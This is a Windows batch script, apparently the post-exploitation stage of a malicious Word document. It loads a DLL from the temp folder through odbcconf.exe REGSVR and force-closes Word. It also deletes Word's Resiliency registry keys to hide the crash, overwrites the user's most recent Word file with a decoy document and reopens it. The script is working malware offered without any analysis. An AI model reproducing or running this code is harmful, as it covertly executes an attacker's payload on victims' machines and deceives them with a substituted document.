ECHO OFF
TIMEOUT 1
IF EXIST "C:\Windows\SysWOW64\odbcconf.exe" (start C:\Windows\SysWOW64\odbcconf.exe /S /A {REGSVR "%TMp%\DlL.DlL"}) ELSE (start odbcconf.exe /S /A {REGSVR "%TMp%\DlL.DlL"})
set "App=winword.exe"TASKKILL /F /IM %App%
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Resiliency /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Resiliency /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Resiliency /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Resiliency /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Word\Resiliency /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Word\Resiliency /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Resiliency /f
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\10.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\11.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\12.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b"
copy %tmp%\decoy.doc "%Ra%"
"%Ra%"
